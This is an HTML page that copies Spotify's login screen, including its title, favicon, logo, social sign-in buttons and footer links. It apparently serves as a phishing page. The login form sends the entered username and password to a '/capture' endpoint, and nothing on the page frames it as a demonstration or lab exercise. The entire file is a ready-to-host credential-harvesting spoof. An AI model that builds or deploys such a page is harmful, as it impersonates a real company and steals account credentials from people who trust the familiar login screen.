<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Spotify</title>
    <link rel="icon" href="https://open.spotify.com/favicon.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Circular+Std:wght@400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
        
        body {
            background: #121212;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            padding: 32px 0 20px;
            text-align: center;
            border-bottom: 1px solid #282828;
        }
        
        .logo {
            width: 40px;
            height: 40px;
            background: #fff;
            border-radius: 50%;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo svg { width: 24px; height: 24px; fill: #1ed760; }
        
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            padding: 40px 20px;
        }
        
        .card {
            width: 100%;
            max-width: 450px;
        }
        
        h1 {
            color: #fff;
            font-size: 32px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 48px;
        }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 500px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            height: 48px;
        }
        
        .btn-google {
            background: #fff;
            color: #000;
        }
        .btn-google:hover { background: #f0f0f0; }
        
        .btn-facebook {
            background: #1877f2;
            color: #fff;
        }
        .btn-facebook:hover { background: #166fe5; }
        
        .btn-apple {
            background: #000;
            color: #fff;
            border: 1px solid #878787;
        }
        .btn-apple:hover { border-color: #fff; }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 32px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #282828;
        }
        .divider span {
            color: #fff;
            padding: 0 16px;
            font-size: 14px;
            font-weight: 700;
        }
        
        .form-group { margin-bottom: 24px; }
        
        label {
            display: block;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 14px;
            background: transparent;
            border: 1px solid #878787;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        input:focus { outline: none; border-color: #fff; }
        input:hover { border-color: #fff; }
        
        .btn-primary {
            background: #1ed760;
            color: #000;
        }
        .btn-primary:hover { background: #1fdf64; }
        
        .forgot {
            color: #1ed760;
            font-size: 16px;
            text-decoration: underline;
            display: block;
            text-align: center;
            margin-top: 24px;
        }
        .forgot:hover { color: #1fdf64; }
        
        .signup {
            margin-top: 40px;
            text-align: center;
            color: #a7a7a7;
            font-size: 16px;
        }
        .signup a {
            color: #fff;
            font-weight: 700;
            text-decoration: underline;
        }
        
        footer {
            padding: 40px 20px;
            text-align: center;
            background: #121212;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }
        .footer-links a {
            color: #a7a7a7;
            font-size: 12px;
            text-decoration: none;
        }
        .footer-links a:hover { color: #1ed760; }
        
        .legal {
            color: #a7a7a7;
            font-size: 11px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.6.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.62.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>
        </div>
    </header>
    
    <div class="container">
        <div class="card">
            <h1>Log in to Spotify</h1>
            
            <button class="btn btn-google">
                <svg viewBox="0 0 24 24" width="20"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                Continue with Google
            </button>
            
            <button class="btn btn-facebook">Continue with Facebook</button>
            <button class="btn btn-apple">Continue with Apple</button>
            
            <div class="divider"><span>or</span></div>
            
            <form action="/capture" method="POST">
                <div class="form-group">
                    <label>Email or username</label>
                    <input type="text" name="username" placeholder="Email or username" required>
                </div>
                
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="btn btn-primary">Log In</button>
            </form>
            
            <a href="#" class="forgot">Forgot your password?</a>
            
            <p class="signup">Don't have an account? <a href="#">Sign up for Spotify</a></p>
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Legal</a>
            <a href="#">Safety & Privacy Center</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Cookies</a>
            <a href="#">About Ads</a>
            <a href="#">Accessibility</a>
        </div>
        <p class="legal">This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</p>
    </footer>
</body>
</html>
